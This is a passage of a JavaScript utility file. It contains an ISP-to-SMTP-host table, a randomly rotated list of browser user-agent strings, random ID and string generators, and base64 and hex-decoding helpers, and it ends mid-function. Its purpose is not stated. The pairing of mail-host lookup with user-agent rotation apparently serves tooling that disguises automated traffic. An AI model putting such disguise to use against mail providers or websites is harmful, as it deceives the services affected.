    '' : ['Amena','','mail.amena.com','',''],
    '' : ['Anew Broadband','','mailhost.anewbroadband.net','',''],
    '' : ['AOL','','smtp.aol.com','',''],
    '' : ['AOL','','za.mx.aol.com','',''],
    '' : ['AOL','','zb.mx.aol.com','',''],
    '' : ['AOL','','zc.mx.aol.com','',''],
    '' : ['aptg','','aptg.net','',''],
    '' : ['Arcor','','mail.arcor.de','',''],
    '' : ['ariadsl','','62.94.10.136','',''],
    '' : ['Ariadsl','','81.29.225.34','',''],
    '' : ['Ariatel','','mail.ariatel.it','',''],
    '' : ['Arnet','','smtp.arnet.com.ar','',''],
    '' : ['Aramiska','','smtp.aramiska.net','',''],
    '' : ['Aruba','','smtp.aruba.it','',''],
    '' : ['aruba.it','','aruba.it','',''],
    '' : ['ASTRAL (Romania)','','mail.b.astral.ro','',''],
    '' : ['Astral-UPC (Romania)','','mail.astralnet.ro','',''],
    '' : ['ASTRAL.RO','','mail.b.astral.ro','',''],
    '' : ['at','','adc.nexteldata.net','',''],
    '' : ['AT&T','','smtp1.attglobal.net','',''],
    '' : ['AT & T Wireless','','smtp.attwireless.net','',''],
    '' : ['AT & T Worldnet','','mailhost.worldnet.att.net','',''],
    '' : ['AT&T WorldNet','','mailhost.att.net','',''],
    '' : ['atlanet','','smtp.atlavia.it','',''],
    '' : ['atlanet','','smtp.weblinea.it','',''],
    '' : ['Atlantic Broadband','','mail.the-beach.net','',''],
    '' : ['atls','','adc.nexteldata.net','',''],
    '' : ['Australink.net','','mail.australink.net','',''],
    '' : ['Auna','','smtp.auna.com','',''],
    '' : ['Axtel','','smtp.axtel.net','',''],
    '' : ['Awalnet','','smtp.awalnet.net.sa','',''],
    '' : ['B2B2C','','smtp.b2b2c.ca','',''],
    '' : ['Bahnhoff','','smtp.bahnhof.se','',''],
    '' : ['','','','',''],
    '' : ['','','','','']

};

function getSmtpConfig (ispDomain) {
    if (!ispDomain || ispDomain==='' || ispDomain==='unknown' || ispDomain==='undefined') {
        return 'undefined';
    } else if (smtpConfig.hasOwnProperty(ispDomain)) {
        return smtpConfig[ispDomain];
    } else {
        return ispDomain;
    }
}
///////////////////end fonction get country name from country code/////////////////////
///////////////////////start fonction random user agent///////////////////////////////

var userAgents = {
  /*  '0' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '1' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '2' : 'Mozilla/5.0(WindowsNT6.1,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '3' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '4' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64,rv:56.0)Gecko/20100101Firefox/56.0',
    '5' : 'Mozilla/5.0(WindowsNT6.1,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '6' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_13_1)AppleWebKit/604.3.5(KHTML,likeGecko)Version/11.0.1Safari/604.3.5',
    '7' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64,rv:57.0)Gecko/20100101Firefox/57.0',
    '8' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_6)AppleWebKit/604.3.5(KHTML,likeGecko)Version/11.0.1Safari/604.3.5',
    '9' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_13_1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '10' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.89Safari/537.36',
    '11' : 'Mozilla/5.0(WindowsNT6.1,Win64,x64,rv:56.0)Gecko/20100101Firefox/56.0',
    '12' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '13' : 'Mozilla/5.0(X11,Linuxx86_64,rv:57.0)Gecko/20100101Firefox/57.0',
    '14' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.75Safari/537.36',
    '15' : 'Mozilla/5.0(WindowsNT6.1,WOW64,Trident/7.0,rv:11.0)likeGecko',
    '16' : 'Mozilla/5.0(X11,Ubuntu,Linuxx86_64,rv:56.0)Gecko/20100101Firefox/56.0',
    '17' : 'Mozilla/5.0(WindowsNT6.1,Win64,x64,rv:57.0)Gecko/20100101Firefox/57.0',
    '18' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/52.0.2743.116Safari/537.36Edge/15.15063',
    '19' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_13)AppleWebKit/604.1.38(KHTML,likeGecko)Version/11.0Safari/604.1.38',
    '20' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_11_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '21' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_6)AppleWebKit/604.1.38(KHTML,likeGecko)Version/11.0Safari/604.1.38',
    '22' : 'Mozilla/5.0(Macintosh,IntelMacOSX10.12,rv:56.0)Gecko/20100101Firefox/56.0',
    '23' : 'Mozilla/5.0(X11,Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.75Safari/537.36',
    '24' : 'Mozilla/5.0(WindowsNT6.3,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '25' : 'Mozilla/5.0(WindowsNT6.1,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.75Safari/537.36',
    '26' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_13_0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '27' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_13_1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '28' : 'Mozilla/5.0(WindowsNT10.0,WOW64,Trident/7.0,rv:11.0)likeGecko',
    '29' : 'Mozilla/5.0(WindowsNT6.1,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.89Safari/537.36',
    '30' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_11_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '31' : 'Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '32' : 'Mozilla/5.0(WindowsNT6.1,Win64,x64,rv:52.0)Gecko/20100101Firefox/52.0',
    '33' : 'Mozilla/5.0(WindowsNT6.3,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '34' : 'Mozilla/5.0(X11,Linuxx86_64,rv:52.0)Gecko/20100101Firefox/52.0',
    '35' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/58.0.3029.110Safari/537.36Edge/16.16299',
    '36' : 'Mozilla/5.0(X11,Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '37' : 'Mozilla/5.0(Macintosh,IntelMacOSX10.12,rv:57.0)Gecko/20100101Firefox/57.0',
    '38' : 'Mozilla/5.0(Macintosh,IntelMacOSX10.13,rv:57.0)Gecko/20100101Firefox/57.0',
    '39' : 'Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '40' : 'Mozilla/5.0(X11,Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.89Safari/537.36',
    '41' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_11_6)AppleWebKit/604.3.5(KHTML,likeGecko)Version/11.0.1Safari/604.3.5',
    '42' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.75Safari/537.36',
    '43' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.89Safari/537.36',
    '44' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36OPR/48.0.2685.52',
    '45' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_10_3)AppleWebKit/600.5.17(KHTML,likeGecko)Version/8.0.5Safari/600.5.17',
    '46' : 'Mozilla/5.0(WindowsNT6.3,Win64,x64,rv:56.0)Gecko/20100101Firefox/56.0',
    '47' : 'Mozilla/5.0(X11,Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '48' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.62Safari/537.36',
    '49' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_6)AppleWebKit/603.3.8(KHTML,likeGecko)Version/10.1.2Safari/603.3.8',
    '50' : 'Mozilla/5.0(X11,Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.62Safari/537.36',
    '51' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_10_5)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '52' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/60.0.3112.113Safari/537.36',
    '53' : 'Mozilla/5.0(WindowsNT6.1,rv:56.0)Gecko/20100101Firefox/56.0',
    '54' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_10_5)AppleWebKit/603.3.8(KHTML,likeGecko)Version/10.1.2Safari/603.3.8',
    '55' : 'Mozilla/5.0(X11,Linuxx86_64,rv:56.0)Gecko/20100101Firefox/56.0',
    '56' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_5)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '57' : 'Mozilla/5.0(Macintosh,IntelMacOSX10.11,rv:56.0)Gecko/20100101Firefox/56.0',
    '58' : 'Mozilla/5.0(WindowsNT10.0,WOW64,rv:56.0)Gecko/20100101Firefox/56.0',
    '59' : 'Mozilla/5.0(WindowsNT6.3,Win64,x64,rv:57.0)Gecko/20100101Firefox/57.0',
    '60' : 'Mozilla/5.0(Macintosh,IntelMacOSX10.13,rv:56.0)Gecko/20100101Firefox/56.0',
    '61' : 'Mozilla/5.0(WindowsNT6.1,WOW64,rv:52.0)Gecko/20100101Firefox/52.0',
    '62' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_13_1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.89Safari/537.36',
    '63' : 'Mozilla/5.0(iPad,CPUOS11_0_3likeMacOSX)AppleWebKit/604.1.38(KHTML,likeGecko)Version/11.0Mobile/15A432Safari/604.1',
    '64' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.89Safari/537.36OPR/49.0.2725.39',
    '65' : 'Mozilla/5.0(WindowsNT6.1,WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '66' : 'Mozilla/5.0(X11,Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)UbuntuChromium/62.0.3202.75Chrome/62.0.3202.75Safari/537.36',
    '67' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/51.0.2704.79Safari/537.36Edge/14.14393',
    '68' : 'Mozilla/5.0(WindowsNT6.1,Trident/7.0,rv:11.0)likeGecko',
    '69' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.62Safari/537.36',
    '70' : 'Mozilla/5.0(WindowsNT10.0,WOW64,Trident/7.0,Touch,rv:11.0)likeGecko',
    '71' : 'Mozilla/5.0(Macintosh,IntelMacOSX10.11,rv:57.0)Gecko/20100101Firefox/57.0',
    '72' : 'Mozilla/5.0(WindowsNT6.1,WOW64,rv:56.0)Gecko/20100101Firefox/56.0',
    '73' : 'Mozilla/5.0(X11,Linuxx86_64,rv:58.0)Gecko/20100101Firefox/58.0',
    '74' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.89Safari/537.36OPR/49.0.2725.47',
    '75' : 'Mozilla/5.0(X11,Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/51.0.2704.106Safari/537.36',
    '76' : 'Mozilla/5.0(compatible,MSIE9.0,WindowsNT6.0,Trident/5.0,Trident/5.0)',
    '77' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_11_6)AppleWebKit/604.1.38(KHTML,likeGecko)Version/11.0Safari/604.1.38',
    '78' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_12_5)AppleWebKit/603.2.4(KHTML,likeGecko)Version/10.1.1Safari/603.2.4',
    '79' : 'Mozilla/5.0(WindowsNT10.0,Win64,x64,rv:58.0)Gecko/20100101Firefox/58.0',
    '80' : 'Mozilla/5.0(WindowsNT6.1,rv:57.0)Gecko/20100101Firefox/57.0',
    '81' : 'Mozilla/5.0(WindowsNT6.1,rv:52.0)Gecko/20100101Firefox/52.0',
    '82' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_13_0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.75Safari/537.36',
    '83' : 'Mozilla/5.0(WindowsNT6.1,WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '84' : 'Mozilla/5.0(WindowsNT6.3,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.75Safari/537.36',
    '85' : 'Mozilla/5.0(compatible,MSIE9.0,WindowsNT6.1,Trident/5.0,Trident/5.0)',
    '86' : 'Mozilla/5.0(Macintosh,IntelMacOSX10_13_0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '87' : 'Mozilla/5.0(WindowsNT10.0,WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/61.0.3163.100Safari/537.36',
    '88' : 'Mozilla/5.0(WindowsNT10.0,WOW64,rv:52.0)Gecko/20100101Firefox/52.0',
    '89' : 'Mozilla/5.0(WindowsNT10.0,WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.94Safari/537.36',
    '90' : 'Mozilla/5.0(WindowsNT6.1,Win64,x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/62.0.3202.62Safari/537.36',
*/
    //'0' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    '0' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
    '1' : 'Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0',
    '2' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    '3' : 'Mozilla/5.0 (Windows NT 10.0; rv:103.0) Gecko/20100101 Firefox/103.0',
    '4' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0',
    //'6' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    //'7' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    '5' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54',
    '6' : 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    //'10' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36',
    '7' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    '8' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
    '9' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    '10' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0',
    '11' : 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
    //'16' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36',
    //'17' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    '12' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36',
    '13' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47',
    '14' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    '15' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63',
    //'22' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    '16' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
    '17' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83',
    '18' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
    '19' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36',
    '20' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0',
    //'28' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
    '21' : 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    '22' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    '23' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36',
    '24' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36',
    '25' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
    '26' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    //'35' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
    '27' : 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    '28' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36',
    '29' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
    '30' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    '31' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36',
    '32' : 'Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0',
    '33' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0',
    //'43' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
    '34' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    '35' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36',
    '36' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)',
    //'47' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
    //'48' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.83 Safari/537.36',
    //'49' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    '37' : 'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0',
    '38' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    //'52' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    '39' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    //'54' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    '40' : 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
    //'56' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
    '41' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.64',
    //'58' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.167 YaBrowser/22.7.3.821 Yowser/2.5 Safari/537.36',
    //'59' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    //'60' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    '42' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.105 Safari/537.36',
    '43' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.15.5 Chrome/87.0.4280.144 Safari/537.36',
    '44' : 'Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
    //"edge"
    '45' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42',//"windows"
    '46' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42',//"macos"
    '47' : 'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36 EdgA/100.0.1185.50',//"android"
    '48' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/100.1185.50 Mobile/15E148 Safari/605.1.15',//"ios"
    //"chrome"
    //'68' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',//"windows"//duplicate
    //'' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',//"macos"//duplicate
    '49'  : 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',//"android"
    '50': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/105.0.5195.129 Mobile/15E148 Safari/604.1',//"ios"
    //"firefox"
    //'' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',//"windows"//duplicate
    '51' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.6; rv:104.0) Gecko/20100101 Firefox/104.0',//"macos"
    //'52' : 'Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/104.0',//"android"
    '52' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/104.0 Mobile/15E148 Safari/605.1.15'//ios"
};
///////////////////end fonction random user agent////////////////////////////


function getRndUserAgent(low=0, high=52) {
        return userAgents[Math.floor(Math.random() * (high - low) + low)];
   
}

function getRndNumber (low, high) {
	return Math.floor(Math.random() * (high+1 - low) + low);
          
}


function randomString(length,char) {
    var chars = "";
if(char==1) {
	chars = "0123456789";
}else if(char==2) {
	chars = "abcdefghiklmnopqrstuvwxyz";
}else if(char == 3) {
	chars = "ABCDEFGHIJKLMNOPQRSTUVWXTZ";
}else if(char == 4){
	chars = "0123456789abcdefghiklmnopqrstuvwxyz";
}else if(char == 5){
	chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZ";
}else if(char == 6){
	chars = "abcdefghiklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXTZ";
}else if(char == 7){
    chars = "abcdefghiklmnopqrstuvwyz"
}else{	
    chars = "0123456789abcdefghiklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXTZ";
}  
	var string_length = length;
	var randomstring = '';
	for (var i=0; i<string_length; i++) {
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum,rnum+1);
	}
	return randomstring;
}

function getRndName (length) {
return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, length);
  }
  
const randomId = function(length = 6) {
  return Math.random().toString(36).substring(2, length+2);
};
//randomId(10)

function isEmpty(obj) {
  for (var arr in obj) {
    return false;
  }
  return true;
}
function btoa_safe(str) {
var buff = Buffer.from(str);  
var buff64 = buff.toString('base64').replace(/\//g, '_').replace(/\+/g, '-').replace(/=/g, '');    
return buff64;
}
function atob_safe(str) {
var data = str.replace(/\_/g, '/').replace(/\-/g, '+');
var buff64 = Buffer.from(data, 'base64');
return buff64.toString('ascii');
}
function DeleteKeyFromObject(Array,KeyName){
return Object.keys(Array).filter(key =>
    key !== KeyName).reduce((obj, key) =>
    {
        obj[key] = Array[key];
        return obj;
    }, {}
);
}

function DecodeHex(data){
        data = data.replace(/\\x20/g, " ");
        data = data.replace(/\\x21/g, "!");
        data = data.replace(/\\x22/g, '"');
        data = data.replace(/\\x23/g, "#");
        data = data.replace(/\\x24/g, "$");
        data = data.replace(/\\x25/g, "%");
        data = data.replace(/\\x26/g, "&");
        data = data.replace(/\\x27/g, "'");
        data = data.replace(/\\x28/g, "(");
        data = data.replace(/\\x29/g, ")");
        data = data.replace(/\\x2A/g, "*");
        data = data.replace(/\\x2B/g, "+");
        data = data.replace(/\\x2C/g, ",");
        data = data.replace(/\\x2D/g, "-");
        data = data.replace(/\\x2E/g, ".");
